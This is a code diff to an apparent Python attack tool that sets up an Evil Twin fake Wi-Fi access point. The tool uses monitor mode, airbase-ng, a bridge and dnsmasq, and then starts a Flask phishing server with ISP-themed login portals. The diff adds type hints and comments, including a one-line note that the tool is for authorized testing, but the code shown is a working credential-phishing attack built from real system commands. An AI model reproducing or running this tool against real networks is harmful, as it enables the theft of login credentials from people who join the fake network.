@@ -8,7 +8,8 @@ from rich.panel import Panel
 
 console = Console()
 
-def get_local_ip():
+def get_local_ip() -> str:
+    """Get the local IP address for the phishing server bridge."""
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("10.255.255.255", 1))
@@ -18,18 +19,24 @@ def get_local_ip():
     except:
         return "10.0.0.1"
 
-def start_fake_ap(interface):
+def start_fake_ap(interface: str) -> None:
+    """
+    Launch a fake access point (Evil Twin) and start the phishing server.
+    This function sets up monitor mode, launches airbase-ng, configures a bridge,
+    starts dnsmasq, and launches a Flask phishing server with ISP-themed portals.
+    Security Warning: This attack is for educational and authorized testing only.
+    """
     ssid = Prompt.ask("[cyan]Enter fake SSID name", default="Free_WiFi_Update")
     channel = Prompt.ask("[cyan]Enter channel", default="6")
     console.print(Panel(f"[bold green]Launching Fake AP: {ssid} on channel {channel}[/]"))
 
-    # Monitor mode
+    # Set interface to monitor mode and channel
     os.system(f"sudo ip link set {interface} down")
     os.system(f"sudo iw dev {interface} set type monitor")
     os.system(f"sudo ip link set {interface} up")
     os.system(f"sudo iwconfig {interface} channel {channel}")
 
-    # Start airbase-ng
+    # Start airbase-ng for the fake AP
     os.system(f"sudo pkill airbase-ng")
     os.system(f"sudo airbase-ng -e \"{ssid}\" -c {channel} {interface} > /dev/null 2>&1 &")
     time.sleep(5)
@@ -41,10 +48,10 @@ def start_fake_ap(interface):
     os.system("sudo ip link set at0 master br0")
     os.system("sudo ip addr add 10.0.0.1/24 dev br0")
 
-    # Start dnsmasq
+    # Start dnsmasq for DHCP/DNS
     os.system("sudo dnsmasq -C dnsmasq.conf")
 
-    # ISP selection
+    # ISP phishing portal selection
     isp_map = {
         "1": "tplink",
         "2": "globe",
@@ -70,6 +77,7 @@ def start_fake_ap(interface):
         border_style="cyan"
     ))
 
+    # Start the phishing server (Flask app)
     subprocess.Popen(["sudo", "python3", "phish_server.py"])
 
     try:
@@ -77,6 +85,7 @@ def start_fake_ap(interface):
         while True:
             time.sleep(1)
     except KeyboardInterrupt:
+        # Cleanup all services and bridge
         os.system("sudo pkill airbase-ng")
         os.system("sudo pkill dnsmasq")
         os.system("sudo pkill python3")
